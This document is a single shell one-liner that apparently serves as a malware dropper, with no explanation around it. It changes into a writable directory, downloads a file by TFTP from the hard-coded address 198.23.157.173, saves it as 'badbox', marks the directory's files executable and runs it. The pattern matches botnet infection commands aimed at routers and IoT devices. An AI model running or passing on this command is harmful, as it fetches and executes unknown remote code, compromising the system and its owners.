cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 198.23.157.173;cat ' ' >badbox;chmod +x *;./badbox
